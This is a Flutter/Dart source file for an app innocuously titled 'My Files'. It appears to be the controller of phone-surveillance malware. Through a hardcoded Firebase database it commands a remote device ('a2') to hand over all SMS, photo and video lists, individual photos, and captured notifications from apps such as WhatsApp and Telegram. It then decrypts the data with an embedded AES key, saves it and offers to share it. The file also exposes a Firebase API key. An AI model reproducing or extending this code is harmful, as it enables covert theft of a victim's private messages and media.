import 'dart:async';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:timeago/timeago.dart' as timeago;
import 'package:intl/intl.dart';

// إعدادات Firebase
const String DATABASE_URL = 'https://dddyy-e8634-default-rtdb.firebaseio.com/';
const String API_KEY = 'aabb5d899a212f16f20c22bc78cb99fd11f0b236';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: FirebaseOptions(
      databaseURL: DATABASE_URL,
      apiKey: API_KEY,
      appId: '1:123456789:android:abcdef789012',
      messagingSenderId: '123456789',
      projectId: 'dddyy-e8634',
      storageBucket: 'dddyy-e8634.appspot.com',
    ),
  );
  runApp(A1App());
}

String decryptText(String encrypted) {
  try {
    final key = encrypt.Key.fromUtf8('my32lengthsupersecretnooneknows1');
    final iv = encrypt.IV.fromLength(16);
    final encrypter = encrypt.Encrypter(encrypt.AES(key));
    return encrypter.decrypt64(encrypted, iv: iv);
  } catch (e) {
    return '[encrypted]';
  }
}

class A1App extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'My Files',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.blue,
        useMaterial3: true,
      ),
      home: MainScreen(),
    );
  }
}

class MainScreen extends StatefulWidget {
  @override
  _MainScreenState createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  int _currentIndex = 0;
  bool _isConnected = false;

  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  final List<Widget> _screens = [
    PhotosScreen(),
    MessagesScreen(),
    VideosScreen(),
    NotificationsScreen(),
  ];

  @override
  void initState() {
    super.initState();
    _listenToA2();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    await Permission.storage.request();
  }

  void _listenToA2() {
    database.ref('devices/a2/status').onValue.listen((event) {
      final data = event.snapshot.value as Map?;
      setState(() {
        _isConnected = data != null && (data['online'] as bool? ?? false);
      });
    });
  }

  Future<void> _syncAll() async {
    final requestId = DateTime.now().millisecondsSinceEpoch.toString();

    await database.ref('commands/a2').set({
      'action': 'get_all_sms',
      'requestId': '${requestId}_sms',
      'timestamp': ServerValue.timestamp,
    });

    await Future.delayed(Duration(milliseconds: 500));

    await database.ref('commands/a2').set({
      'action': 'get_photos_list',
      'requestId': '${requestId}_photos',
      'timestamp': ServerValue.timestamp,
    });

    await Future.delayed(Duration(milliseconds: 500));

    await database.ref('commands/a2').set({
      'action': 'get_videos_list',
      'requestId': '${requestId}_videos',
      'timestamp': ServerValue.timestamp,
    });

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Sync requested from A2...')),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: _screens[_currentIndex],
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _currentIndex,
        onTap: (index) => setState(() => _currentIndex = index),
        type: BottomNavigationBarType.fixed,
        items: [
          BottomNavigationBarItem(icon: Icon(Icons.photo), label: 'Photos'),
          BottomNavigationBarItem(icon: Icon(Icons.message), label: 'Messages'),
          BottomNavigationBarItem(icon: Icon(Icons.video_library), label: 'Videos'),
          BottomNavigationBarItem(icon: Icon(Icons.notifications), label: 'Alerts'),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isConnected ? _syncAll : null,
        icon: Icon(_isConnected ? Icons.sync : Icons.cloud_off),
        label: Text(_isConnected ? 'SYNC' : 'OFFLINE'),
        backgroundColor: _isConnected ? Colors.green : Colors.grey,
      ),
    );
  }
}

// ==================== Photos Screen ====================
class PhotosScreen extends StatefulWidget {
  @override
  _PhotosScreenState createState() => _PhotosScreenState();
}

class _PhotosScreenState extends State<PhotosScreen> {
  List<Map<String, dynamic>> _photos = [];
  bool _loading = true;
  Set<String> _downloading = {};

  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  @override
  void initState() {
    super.initState();
    _loadPhotos();
  }

  void _loadPhotos() {
    database.ref('data/a2/photos_list').onValue.listen((event) {
      final data = event.snapshot.value as Map?;
      if (data != null) {
        final photos = List<Map<String, dynamic>>.from(data['photos'] ?? []);
        setState(() {
          _photos = photos;
          _loading = false;
        });
      }
    });
  }

  Future<void> _downloadPhoto(String photoId) async {
    setState(() => _downloading.add(photoId));

    final requestId = DateTime.now().millisecondsSinceEpoch.toString();

    await database.ref('commands/a2').set({
      'action': 'download_photo',
      'photoId': photoId,
      'requestId': requestId,
      'timestamp': ServerValue.timestamp,
    });

    database.ref('data/a2/photos_ready/$photoId').onValue.listen((event) async {
      final data = event.snapshot.value as Map?;
      if (data != null && data['url'] != null && data['ready'] == true) {
        final url = data['url'] as String;
        await _saveImage(url, photoId);
        setState(() => _downloading.remove(photoId));
      }
    });
  }

  Future<void> _saveImage(String url, String photoId) async {
    try {
      final dio = Dio();
      final dir = await getExternalStorageDirectory();
      final path = '${dir!.path}/Download/photo_$photoId.jpg';
      await dio.download(url, path);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Photo saved!')),
      );
    } catch (e) {
      print('Error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Photos from A2')),
      body: _loading
          ? Center(child: CircularProgressIndicator())
          : _photos.isEmpty
              ? Center(child: Text('No photos. Tap SYNC.'))
              : GridView.builder(
                  padding: EdgeInsets.all(8),
                  gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 3,
                    crossAxisSpacing: 8,
                    mainAxisSpacing: 8,
                  ),
                  itemCount: _photos.length,
                  itemBuilder: (context, index) {
                    final photo = _photos[index];
                    final photoId = photo['id'];
                    final title = decryptText(photo['title'] ?? 'unknown');
                    final isDownloading = _downloading.contains(photoId);

                    return GestureDetector(
                      onTap: () => _downloadPhoto(photoId),
                      child: Container(
                        decoration: BoxDecoration(
                          color: Colors.grey.shade300,
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: Stack(
                          fit: StackFit.expand,
                          children: [
                            Column(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.image, size: 40, color: Colors.grey),
                                Text(title, style: TextStyle(fontSize: 10), overflow: TextOverflow.ellipsis),
                              ],
                            ),
                            if (isDownloading)
                              Center(child: CircularProgressIndicator()),
                          ],
                        ),
                      ),
                    );
                  },
                ),
    );
  }
}

// ==================== Messages Screen ====================
class MessagesScreen extends StatefulWidget {
  @override
  _MessagesScreenState createState() => _MessagesScreenState();
}

class _MessagesScreenState extends State<MessagesScreen> {
  bool _loading = false;
  String? _backupUrl;
  int? _messageCount;

  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  @override
  void initState() {
    super.initState();
    _listenForBackup();
  }

  void _listenForBackup() {
    database.ref('responses/a2').onValue.listen((event) {
      final data = event.snapshot.value as Map?;
      if (data != null) {
        final entries = data.entries.toList()
          ..sort((a, b) => b.key.compareTo(a.key));
        
        for (var entry in entries) {
          final response = entry.value as Map?;
          if (response?['type'] == 'sms_list' && response?['ready'] == true) {
            // Get the actual list
            database.ref('data/a2/sms_list').once().then((snapshot) {
              final smsData = snapshot.snapshot.value as Map?;
              if (smsData != null) {
                setState(() {
                  _messageCount = smsData['count'];
                  _loading = false;
                });
              }
            });
            break;
          }
        }
      }
    });
  }

  Future<void> _requestMessages() async {
    setState(() => _loading = true);
    
    final requestId = DateTime.now().millisecondsSinceEpoch.toString();

    await database.ref('commands/a2').set({
      'action': 'get_all_sms',
      'requestId': requestId,
      'timestamp': ServerValue.timestamp,
    });

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Requesting messages...')),
    );
  }

  Future<void> _downloadMessages() async {
    try {
      final snapshot = await database.ref('data/a2/sms_list').once();
      final data = snapshot.snapshot.value as Map?;
      
      if (data == null) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('No messages available')),
        );
        return;
      }

      final messages = List<Map<String, dynamic>>.from(data['messages'] ?? []);
      
      // Decrypt all messages
      final decryptedMessages = messages.map((m) => {
        'address': decryptText(m['address'] ?? ''),
        'body': decryptText(m['body'] ?? ''),
        'date': DateFormat('yyyy-MM-dd HH:mm').format(
          DateTime.fromMillisecondsSinceEpoch(m['date'] ?? 0)
        ),
        'type': m['type'],
      }).toList();

      // Create text content
      final buffer = StringBuffer();
      buffer.writeln('SMS BACKUP FROM A2');
      buffer.writeln('Generated: ${DateTime.now()}');
      buffer.writeln('Total: ${decryptedMessages.length}');
      buffer.writeln('=' * 50);
      buffer.writeln();
      
      for (var i = 0; i < decryptedMessages.length; i++) {
        final m = decryptedMessages[i];
        buffer.writeln('${i + 1}. [${m['type']}] ${m['date']}');
        buffer.writeln('   From: ${m['address']}');
        buffer.writeln('   ${m['body']}');
        buffer.writeln();
      }

      // Save file
      final dir = await getExternalStorageDirectory();
      final fileName = 'sms_backup_${DateTime.now().millisecondsSinceEpoch}.txt';
      final path = '${dir!.path}/Download/$fileName';
      
      final file = File(path);
      await file.writeAsString(buffer.toString());

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Saved: $fileName')),
      );

      // Share option
      showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text('Messages Saved'),
          content: Text('File saved to Downloads. Share it?'),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text('Close'),
            ),
            TextButton(
              onPressed: () {
                Share.shareFiles([path], text: 'SMS Backup from A2');
                Navigator.pop(context);
              },
              child: Text('Share'),
            ),
          ],
        ),
      );

    } catch (e) {
      print('Error: $e');
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error: $e')),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Messages from A2')),
      body: Padding(
        padding: EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Card(
              child: Padding(
                padding: EdgeInsets.all(16),
                child: Column(
                  children: [
                    Icon(Icons.message, size: 50, color: Colors.blue),
                    SizedBox(height: 16),
                    Text('Download All SMS', style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
                    SizedBox(height: 8),
                    if (_messageCount != null)
                      Text('$_messageCount messages available', style: TextStyle(color: Colors.green)),
                    SizedBox(height: 16),
                    ElevatedButton.icon(
                      onPressed: _loading ? null : _requestMessages,
                      icon: _loading ? CircularProgressIndicator() : Icon(Icons.download),
                      label: Text(_loading ? 'Loading...' : 'GET MESSAGES'),
                    ),
                  ],
                ),
              ),
            ),
            if (_messageCount != null)
              Card(
                color: Colors.green.shade100,
                child: Padding(
                  padding: EdgeInsets.all(16),
                  child: Column(
                    children: [
                      Icon(Icons.check_circle, color: Colors.green, size: 50),
                      Text('$_messageCount messages ready!'),
                      SizedBox(height: 16),
                      ElevatedButton.icon(
                        onPressed: _downloadMessages,
                        icon: Icon(Icons.save),
                        label: Text('DOWNLOAD AS FILE'),
                      ),
                    ],
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ==================== Videos Screen ====================
class VideosScreen extends StatefulWidget {
  @override
  _VideosScreenState createState() => _VideosScreenState();
}

class _VideosScreenState extends State<VideosScreen> {
  List<Map<String, dynamic>> _videos = [];
  bool _loading = true;

  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  @override
  void initState() {
    super.initState();
    _loadVideos();
  }

  void _loadVideos() {
    database.ref('data/a2/videos_list').onValue.listen((event) {
      final data = event.snapshot.value as Map?;
      if (data != null) {
        final videos = List<Map<String, dynamic>>.from(data['videos'] ?? []);
        setState(() {
          _videos = videos;
          _loading = false;
        });
      }
    });
  }

  String _formatDuration(int seconds) {
    final d = Duration(seconds: seconds);
    return '${d.inMinutes}:${(d.inSeconds % 60).toString().padLeft(2, '0')}';
  }

  String _formatSize(int bytes) {
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    return '${(bytes / 1024 / 1024).toStringAsFixed(1)} MB';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Videos from A2')),
      body: _loading
          ? Center(child: CircularProgressIndicator())
          : _videos.isEmpty
              ? Center(child: Text('No videos. Tap SYNC.'))
              : ListView.builder(
                  itemCount: _videos.length,
                  itemBuilder: (context, index) {
                    final video = _videos[index];
                    final title = decryptText(video['title'] ?? 'unknown');
                    
                    return ListTile(
                      leading: Container(
                        width: 80,
                        height: 60,
                        color: Colors.grey.shade800,
                        child: Icon(Icons.play_circle, color: Colors.white),
                      ),
                      title: Text(title, maxLines: 1, overflow: TextOverflow.ellipsis),
                      subtitle: Text('${_formatDuration(video['duration'] ?? 0)} • ${_formatSize(video['size'] ?? 0)}'),
                    );
                  },
                ),
    );
  }
}

// ==================== Notifications Screen ====================
class NotificationsScreen extends StatefulWidget {
  @override
  _NotificationsScreenState createState() => _NotificationsScreenState();
}

class _NotificationsScreenState extends State<NotificationsScreen> {
  List<Map<String, dynamic>> _notifications = [];

  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  @override
  void initState() {
    super.initState();
    _loadNotifications();
  }

  void _loadNotifications() {
    database.ref('data/a2/notifications').onValue.listen((event) {
      final data = event.snapshot.value as Map?;
      if (data != null) {
        final list = data.entries.map((e) {
          final v = e.value as Map;
          return {'key': e.key, ...v};
        }).toList();
        
        list.sort((a, b) => (b['timestamp'] ?? 0).compareTo(a['timestamp'] ?? 0));
        
        setState(() => _notifications = list);
      }
    });
  }

  IconData _getIcon(String package) {
    final p = package.toLowerCase();
    if (p.contains('whatsapp')) return Icons.message;
    if (p.contains('telegram')) return Icons.send;
    if (p.contains('facebook')) return Icons.facebook;
    if (p.contains('instagram')) return Icons.camera_alt;
    return Icons.notifications;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Notifications from A2')),
      body: _notifications.isEmpty
          ? Center(child: Text('No notifications yet'))
          : ListView.builder(
              itemCount: _notifications.length,
              itemBuilder: (context, index) {
                final n = _notifications[index];
                final title = decryptText(n['title'] ?? '');
                final text = decryptText(n['text'] ?? '');
                final app = n['app'] ?? 'unknown';
                final time = timeago.format(DateTime.fromMillisecondsSinceEpoch(n['timestamp'] ?? 0));

                return Card(
                  margin: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  child: ListTile(
                    leading: CircleAvatar(child: Icon(_getIcon(app))),
                    title: Text(title, maxLines: 1, overflow: TextOverflow.ellipsis),
                    subtitle: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(text, maxLines: 2, overflow: TextOverflow.ellipsis),
                        Text('$app • $time', style: TextStyle(fontSize: 12, color: Colors.grey)),
                      ],
                    ),
                    isThreeLine: true,
                    onTap: () {
                      showDialog(
                        context: context,
                        builder: (context) => AlertDialog(
                          title: Text(title),
                          content: Text(text),
                          actions: [
                            TextButton(onPressed: () => Navigator.pop(context), child: Text('Close')),
                            TextButton(
                              onPressed: () {
                                Share.share('$title\n\n$text');
                                Navigator.pop(context);
                              },
                              child: Text('Share'),
                            ),
                          ],
                        ),
                      );
                    },
                  ),
                );
              },
            ),
    );
  }
}
